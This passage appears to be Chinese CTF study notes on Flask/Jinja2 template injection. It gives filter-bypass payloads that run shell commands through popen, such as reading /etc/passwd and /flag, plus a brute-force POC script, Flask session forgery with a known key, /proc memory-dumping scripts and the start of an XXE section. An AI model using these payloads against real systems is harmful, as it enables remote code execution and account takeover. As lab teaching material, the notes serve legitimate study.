
@app.route("/")
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

注意记住格式照套就行

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
    	<li>{{ girl }}</li>
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板if判断

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    return flask.render_template("index.html", girls=girls)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<ul>
    {% for girl in girls%}
        {% if girl|length >= 3 %}
            <li class="a">{{ girl }}</li>
        {% else %}
            <li>{{ girl }}</li>
        {% endif %}
    {% endfor %}
</ul>
</body>
</html>
```

#### flask模板变量

![image-20230902184656320](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184656320.png)

### 2. 绕过思路

![image-20230902184904928](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902184904928.png)

**索引搜索POC代码**

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/2'
target_function = "popen"

for i in range(500):
    payload = "{% if ''.__class__.__base__.__subclasses__()[" + str(i) +"].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if 'benben' in res.text:
            print("可利用索引：{}；\npayload：{}".format(i, payload))
    except Exception as e:
        print(e)

```

### 3. 解题流程

#### a. 搜索索引值

运行POC代码得到的结果：

```
可利用索引：117；
payload：{% if ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()%}benben{%endif%}
```

可知到索引值为117

#### b. 输出结果

![image-20230902185046050](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185046050.png)

![image-20230902185228558](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185228558.png)

![image-20230827203210371](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827203210371.png)

## 0x10 getitem绕过中括号过滤

### 1. `__getitem__`魔术方法

**对字典使用时，传入字符串，返回字典响应键所对应的值**

对列表使用时，传入整数返回列表索引值

```py
dict1 = {
    '1': 'a',
    '2': 'b',
    '3': 'c'
}

print(dict1.__getitem__('1'))		# 等于：dict['1']

# 输出
b
```

### 2. 解题流程

将中括号的地方改成使用`__getitem__`即可

```
payload：code={{''.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}} 
```

![image-20230827233510691](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230827233510691.png)

## 0x11 request 绕过单双引号过滤

> 这里的 request 并非python中的 requests 模块，而是flask中的 request

### 1. 前置知识

![image-20230828134401918](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828134401918.png)

#### GET | POST | Cookie 传参

**app.py**

```
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    return flask.render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

**index.html**

```py
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>GET 传参：{{ request.args.k1 }}</p>
<p>POST 传参：{{ request.form.k1 }}</p>
<p>Cookie 传参：{{ request.cookies.k1}}</p>
</body>
</html>
```

### 2. 绕过实战

因为不能使用单双引号，所以在返回字典时，无法使用直接 键（str）来获取值，此时可以使用：`xxx.__globals__[request.args.k1]`

#### GET 传参绕过

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.popen](request.args.cmd).read()}}

GET 传参：
popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135357227.png" alt="image-20230828135357227" style="zoom:67%;" />

#### POST传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.popen](request.form.cmd).read()}}&popen=popen&cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135455299.png" alt="image-20230828135455299" style="zoom:67%;" />

#### Cookie 传参

```
payload：
code={{[].__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}

Cookie 传参：
popen=popen;cmd=cat /flag
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828135611577.png" alt="image-20230828135611577" style="zoom:67%;" />

## 0x12 过滤器过下划线绕过

### 1. 前置知识

#### flask常用过滤器

```
length() # 获取一个序列或者字典的长度并将其返回
int()：# 将值转换为int类型；
float()：# 将值转换为float类型；
lower()：# 将字符串转换为小写；
upper()：# 将字符串转换为大写；
reverse()：# 反转字符串；
replace(value,old,new)： # 将value中的old替换为new
list()：# 将变量转换为列表类型；
string()：# 将变量转换成字符串类型；
join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
attr(): # 获取对象的属性
```

#### 简单使用

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/", methods=['POST', 'GET'])
def index():
    girls = ['安其拉', '王昭君', '艾琳', '艾希', '李元芳']
    user = "woyaodaxie"
    return flask.render_template("index.html", girls=girls, user=user)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .a{
            color: red;
            font-weight:bold;
        }
    </style>
</head>
<body>
<p>index 页面</p>
<p>列表长度：{{ girls|length }}</p>
{{girls.append("卡特琳娜")}}
<p>列表长度：{{ girls|length }}</p>
<p>{{ user|upper}}</p>
    
<p>{{''|attr('__class__')}}</p>
</body>
</html>
```

![image-20230828143442358](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828143442358.png)



### 2. 绕过实战

#### `attr()`绕过下划线

```
payload：
code={{''|attr(request.args.cls)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)('popen')('cat /flag')|attr('read')()}}

GET 传参：
cls=__class__&bas=__base__&sub=__subclasses__&geti=__getitem__&ini=__init__&glo=__globals__
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828144840762.png" alt="image-20230828144840762" style="zoom:67%;" />

#### Unicode编码绕过

```
payload：
code={{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828145528225.png" alt="image-20230828145528225" style="zoom:67%;" />

#### 16位编码

```
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828150207220.png" alt="image-20230828150207220" style="zoom:67%;" />

## 0x13 中括号绕过点过滤

### 1. attr绕过

使用 attr 也不会出现`.`

```
payload:
code={{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(117)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('cat /flag')|attr('read')()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828151159447.png" alt="image-20230828151159447" style="zoom:67%;" />

### 2. 中括号绕过

python 语法中除了可以使用`.`来访问对象属性外，还可以使用`[]`来访问

```
payload：
code={{''['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828152128112.png" alt="image-20230828152128112" style="zoom:67%;" />

## 0x13 饶过关键字过滤

### 1. 编码绕过

使用 Unicode、16位编码等方式绕过

```
payload：
{{''|attr("\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F")|attr("\u005F\u005F\u0062\u0061\u0073\u0065\u005F\u005F")|attr("\u005F\u005F\u0073\u0075\u0062\u0063\u006C\u0061\u0073\u0073\u0065\u0073\u005F\u005F")()|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")(117)|attr("\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F")|attr("\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F")|attr("\u005F\u005F\u0067\u0065\u0074\u0069\u0074\u0065\u006D\u005F\u005F")("popen")("cat /flag")|attr('read')()}}

payload 原型：
{{''|attr('__class__')|attr(__base__)|attr(__subclasses__)()|attr(__getitem__)(117)|attr(__init__)|attr(__globals__)|attr(__getitem__)('popen')('cat /flag')|attr('read')()}}
```



```
payload:
payload：
code={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("ls").read()}}
```

### 2. 字符串拼接

用`+`连接字符串：`'__cl'+'ass__'`

```
payload：
code={{''['__cl'+'ass__']['__bas'+'e__']['__subcla'+'sses__']()[117]['__ini'+'t__']['__glob'+'als__']['po'+'pen']('cat /flag').read()}}
```

### 3. `~`拼接

![image-20230902185357324](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185357324.png)

![image-20230902185520544](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185520544.png)

### 4. 使用过滤器（reverse反转、replace替换、join拼接等）

#### reverse反转

![image-20230902185533548](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185533548.png)

#### replace替换

![image-20230902185542117](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185542117.png)

![image-20230828203905003](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828203905003.png)

#### join拼接

![image-20230902185555482](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185555482.png)

![image-20230828204025438](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828204025438.png)

## 0x14 `length`过滤器绕过数字过滤

### 1. 前置知识

以操作符来分割

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>数量：{{'aaaaaaaaaaaa'|length*'aaaaaaaaaa'|length-'aaa'|length}}</p>
</body>
</html>

<!--输出：117-->
```

### 2. 绕过实战

先定义一个变量来存储数字

![image-20230902185609618](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185609618.png)

![image-20230828205237772](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230828205237772.png)

## 0x15 获取config文件

这个先记住可通过这两条payload来获取config文件的内容就好

```
payload:
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

## 0x16 混合过滤一

```
目标WAF: bl[’’’, ‘"’, ‘+’, ‘request’, ‘.’, ‘[’, ‘]’]
```

### 1. 前置知识

注意通过 list 过滤器将对象转换为列表

![image-20230902185629649](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185629649.png)

**组装语句：`cat flag`**

![image-20230902185705408](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185705408.png)

### 2. 绕过实战

使用 join 提取变量名

![image-20230902185712877](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902185712877.png)

![image-20230829152817366](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829152817366.png)

## 0x17 混合过滤二

![image-20230829172702086](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230829172702086.png)

# FLASK Session 伪造

## 1. 认识Flask Session

除了请求对象之外还有一种称为 [`session`](https://dormousehole.readthedocs.io/en/latest/api.html#flask.session) 的对象，允许您在 不同请求之间储存信息。这个对象相当于用密钥签名加密的 cookie ，即用户 可以查看您的 cookie ，但是如果没有密钥就无法修改它。

使用会话之前您必须设置一个密钥。举例说明:

```python
import flask
from flask import session,request,redirect,url_for

app = flask.Flask(__name__)
# 指定 secret_key
app.secret_key = '123456'


@app.route('/')
def index():
    if 'username' in session:
        print(session)
        return f'Logged in as {session["username"]}'
    return 'You are not logged in'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['username'] = request.form['username']
        return redirect(url_for('index'))
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=submit value=Login>
        </form>
    '''


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```

在`/login`中登录`sugar`用户拿到了下面的Cookie

```
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE
Cookie 格式：base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名
```

***时间戳***用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；***签名***是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。

## 2. Flask Session 加解密

> 工具地址：https://github.com/noraj/flask-session-cookie-manager

### 2.1 使用方法

#### Encode

```
usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <string> -t <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -t <string>, --cookie-structure <string>
                        Session cookie structure
```

#### Decode

```
usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <string>] -c <string>

optional arguments:
  -h, --help            show this help message and exit
  -s <string>, --secret-key <string>
                        Secret key
  -c <string>, --cookie-value <string>
                        Session cookie value
```

#### Examples

```bash
# 加密；由于加密的时间戳不一样，所以后面两段也会不一样
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'sugar'}"
eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeMxQ.Q_Jii2nKHpZbCIE0PpC-wu2nSLg

# 解密：
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py decode -s '123456' -c 'eyJ1c2VybmFtZSI6InN1Z2FyIn0.ZVeIiA.Y-4ERNC7D9bs9nxtDvf2YiGROJE'
{'username': 'sugar'}
```

## 3. Flask Session 伪造

**伪造前期：拿到`SECRET_KEY`**

将上面的 Flask 代码在本地搭建

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001507347.png" alt="image-20231118001507347" style="zoom: 67%;" />

路由到`/login`登录

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001535832.png" alt="image-20231118001535832" style="zoom: 67%;" />

单击login后可看到我们现在的身份是：sugar

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001607950.png" alt="image-20231118001607950" style="zoom: 67%;" />

使用上面的工具伪造一段Session

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/flask-session-cookie-manager]
└─# python3 flask_session_cookie_manager3.py encode -s '123456' -t "{'username': 'admin'}"                                         
eyJ1c2VybmFtZSI6ImFkbWluIn0.ZVeQzA.bAPRIEf6W2867fmwCgFuvBG5CXA
```

将这段Session粘贴到Cookie中；用hackbar或者bp，伪造成功！

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231118001737343.png" alt="image-20231118001737343" style="zoom: 67%;" />

# Linux 虚拟文件系统 /proc

## 1. Linux 常用虚拟文件

**/proc/[pid]/auxv**

/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下：

```
$ hexdump -x /proc/2406/auxv

0000000    0021    0000    0000    0000    f000    f7fa    7fff    0000
0000010    0010    0000    0000    0000    fbff    1f8b    0000    0000
0000020    0006    0000    0000    0000    1000    0000    0000    0000
0000030    0011    0000    0000    0000    0064    0000    0000    0000
0000040    0003    0000    0000    0000    0040    0040    0000    0000
0000050    0004    0000    0000    0000    0038    0000    0000    0000
0000060    0005    0000    0000    0000    0007    0000    0000    0000
0000070    0007    0000    0000    0000    0000    0000    0000    0000
0000080    0008    0000    0000    0000    0000    0000    0000    0000
0000090    0009    0000    0000    0000    55e0    0045    0000    0000
00000a0    000b    0000    0000    0000    0000    0000    0000    0000
00000b0    000c    0000    0000    0000    0000    0000    0000    0000
00000c0    000d    0000    0000    0000    0000    0000    0000    0000
00000d0    000e    0000    0000    0000    0000    0000    0000    0000
00000e0    0017    0000    0000    0000    0000    0000    0000    0000
00000f0    0019    0000    0000    0000    f079    f7f6    7fff    0000
0000100    001f    0000    0000    0000    ffea    f7f6    7fff    0000
0000110    000f    0000    0000    0000    f089    f7f6    7fff    0000
0000120    0000    0000    0000    0000    0000    0000    0000    0000
0000130
```

**/proc/[pid]/cmdline**

/proc/[pid]/cmdline 是一个只读文件，包含进程的完整[命令](https://www.linuxcool.com/)行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下：

```
$ ps aux|grep frps
root      2406  0.1  0.1  54880 10524 ?        Sl   Dec11  21:30 frps -c ./frps.ini

$ cat /proc/2406/cmdline
frps-c./frps.ini
```

**/proc/[pid]/comm**

/proc/[pid]/comm 包含进程的[命令](https://www.linuxcool.com/)名。举例如下：

```
$ cat /proc/2406/comm
frps
```

**/proc/[pid]/cwd**

/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下：

```
$ ls -lt /proc/2406/cwd
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/cwd -> /home/mike/frp_0.13.0_linux_amd64
```

**/proc/[pid]/environ**

/proc/[pid]/environ 显示进程的环境变量。举例如下：

```
$ strings /proc/2406/environ

SUPERVISOR_GROUP_NAME=ssh
TERM=linux
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=ssh
RUNLEVEL=2
UPSTART_EVENTS=runlevel
PREVLEVEL=N
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
UPSTART_INSTANCE=
UPSTART_JOB=rc
SUPERVISOR_ENABLED=1
runlevel=2
PWD=/
previous=N
```

**/proc/[pid]/exe**

/proc/[pid]/exe 为实际运行程序的符号链接。举例如下：

```
$ ls -lt /proc/2406/exe
lrwxrwxrwx 1 root root 0 Dec 11 19:00 /proc/2406/exe -> /usr/bin/frps
```

**/proc/[pid]/fd**

/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下：

```
$ ls -lt /proc/2406/fd

lrwx------ 1 root root 64 Dec 24 09:39 77 -> socket:[44377722]
lrwx------ 1 root root 64 Dec 17 15:07 47 -> socket:[29482617]
lr-x------ 1 root root 64 Dec 12 20:18 0 -> pipe:[13282]
l-wx------ 1 root root 64 Dec 12 20:18 1 -> pipe:[13283]
lrwx------ 1 root root 64 Dec 12 20:18 10 -> socket:[12238218]
lrwx------ 1 root root 64 Dec 12 20:18 4 -> anon_inode:[eventpoll]
lrwx------ 1 root root 64 Dec 12 20:18 40 -> socket:[19378614]
```

目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。

**/proc/[pid]/latency**

/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行：

```
$ echo 1 > /proc/sys/kernel/latencytop
```

举例如下

```
$ cat /proc/2406/latency

Latency Top version : v0.1
30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d
8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc
```

每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。

**/proc/[pid]/maps**

/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下：

```
$ cat /proc/2406/maps
00400000-006ea000 r-xp 00000000 fd:01 1727569                            /usr/bin/frps
006ea000-00a6c000 r--p 002ea000 fd:01 1727569                            /usr/bin/frps
00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569                            /usr/bin/frps
00ab1000-00ad4000 rw-p 00000000 00:00 0
c000000000-c00000b000 rw-p 00000000 00:00 0
c41feac000-c420000000 rw-p 00000000 00:00 0
c420000000-c420400000 rw-p 00000000 00:00 0
c420400000-c420700000 rw-p 00000000 00:00 0
c420700000-c420800000 rw-p 00000000 00:00 0
c420800000-c420900000 rw-p 00000000 00:00 0
c420900000-c420a00000 rw-p 00000000 00:00 0
c420a00000-c421ea0000 rw-p 00000000 00:00 0
c421ea0000-c422a00000 rw-p 00000000 00:00 0
c422a00000-c422a60000 rw-p 00000000 00:00 0
7f0418c01000-7f0418ee1000 rw-p 00000000 00:00 0
7ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0                          [stack:5121]
7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0                          [vvar]
7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。

**/proc/[pid]/root**

/proc/[pid]/root 是进程根目录的符号链接。举例如下：

```
$  ls -lt /proc/2406/root
lrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/root -> /
```

**/proc/[pid]/stack**

/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下：

```
$ cat /proc/2406/stack
[] futex_wait_queue_me+0xc6/0x130
[] futex_wait+0x17d/0x270
[] do_futex+0xd5/0x520
[] SyS_futex+0x71/0x150
[] entry_SYSCALL_64_fastpath+0x16/0x75
[] 0xffffffffffffffff
```

**/proc/[pid]/statm**

/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下：

```
$ cat /proc/2406/statm
13720 2617 493 746 0 12007 0
```

各个值含义：

```
a）进程占用的总的内存
b）进程当前时刻占用的物理内存
c）同其它进程共享的内存
d）进程的代码段
e）共享库(从2.6版本起，这个值为0)
f）进程的堆栈
g）dirty pages(从2.6版本起，这个值为0)
```

**/proc/[pid]/status**

/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下：

```
$ cat /proc/2406/status
Name:   frps
State:  S (sleeping)
Tgid:   2406
Ngid:   0
Pid:    2406
PPid:   2130
TracerPid:  0
Uid:    0   0   0   0
Gid:    0   0   0   0
FDSize: 128
Groups: 0
NStgid: 2406
NSpid:  2406
NSpgid: 2406
NSsid:  2130
VmPeak:    54880 kB
VmSize:    54880 kB
VmLck:         0 kB
VmPin:         0 kB
VmHWM:     34872 kB
VmRSS:     10468 kB
VmData:    47896 kB
VmStk:       132 kB
VmExe:      2984 kB
VmLib:         0 kB
VmPTE:        68 kB
VmPMD:        20 kB
VmSwap:        0 kB
HugetlbPages:          0 kB
Threads:    11
SigQ:   0/31834
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: 0000000000000000
SigIgn: 0000000000000000
SigCgt: fffffffe7fc1feff
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Seccomp:    0
Cpus_allowed:   f
Cpus_allowed_list:  0-3
Mems_allowed:   00000000,00000001
Mems_allowed_list:  0
voluntary_ctxt_switches:    2251028
nonvoluntary_ctxt_switches: 18031
```

关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 Unix: Dealing with signals）。

**/proc/[pid]/syscall**

/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下：

```
$ cat /proc/2406/syscall
202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3
```

第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。

内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。

**/proc/[pid]/wchan**

/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下：

```
$ cat /proc/2406/wchan
futex_wait_queue_meadmin
```

**/proc/[pic]/mem**

访问指定程序的内存信息，由于有一些内存空间没有权限问，所以会报错

```bbash
┌──(kali㉿kali)-[~/test]
└─$ sudo cat /proc/2663/mem    
cat: /proc/2663/mem: 输入/输出错误
```

## 2. Linux 访问内存文件

使用**/proc/[pid]/maps**可查看程的内存区域映射信息。一般权限是`rw-`的才能读取

```bash
55b8a2ccf000-55b8a2cd3000 rw-p 00000000 00:00 0 
55b8a345b000-55b8a349f000 rw-p 00000000 00:00 0                          [heap]
55b8a349f000-55b8a367b000 rw-p 00000000 00:00 0                          [heap]
55b8a367b000-55b8a36c2000 rw-p 00000000 00:00 0                          [heap]
```

使用python脚本访问相应的内存信息

```py
# 十六进制转十进制
seek_start = int('55b8a349f000', 16)
seek_end = int('55b8a367b000', 16)
with open('/proc/2663/mem', 'rb') as f:
    # 将光标定位到有权访问的位置
    f.seek(seek_start)
   	# 访问有权访问的长度
    data = f.read(seek_end - seek_start)

print(data)
```

## 3. Python 批量访问脚本

```py
import re


def read_mem(pid):
    # 读取 maps 文件
    with open(f"/proc/{pid}/maps", 'rb') as f:
        # 将 maps.txt 信息写入记事本
        with open('maps.txt', 'wb') as j:
            j.write(f.read())

    # 55b8a2ccb000-55b8a2ccf000
    # 逐行读取 maps.txt
    with open('maps.txt', 'r') as f:
        # 逐行读取文件
        for line in f:
            if 'rw-p' in line:
                start = re.search('([0-9a-z]{12})-', line)
                end = re.search('-([0-9a-z]{12})', line)

                # 格式处理
                start = int(str(start.group(1)), 16)
                end = int(str(end.group(1)), 16)
                with open(f'/proc/{pid}/mem', 'rb') as mem:
                    mem.seek(start)
                    mem_data = mem.read(end - start)

                    # 得到的结果最后保存
                    with open('result.txt', 'wb') as res:
                        res.write(mem_data)


if __name__ == '__main__':
    # 你要访问的内存他的PID是多少这里就是多少
    read_mem(2663)
```

# XXE注入

## 1. PHP 解析XML

### 1. PHP XML DOM

#### 1.1 XML 解析

如需读取和更新 - 创建和处理 - 一个 XML 文档，您需要 XML 解析器。

有两种基本的 XML 解析器类型：

- 基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。
- 基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。

DOM 解析器是基于树的解析器。

请看下面的 XML 文档片段：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<from>Jani</from>
```

XML DOM 把上面的 XML 视为一个树形结构：

- Level 1: XML 文档
- Level 2: 根元素： `<from>`
- Level 3: 文本元素： `Jani`

#### 1.2 XML 文件

将下面的内容保存名为：`text.xml`

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

#### 1.3 加载和输出XML

```php
<?php
$xmlDoc = new DOMDocument();
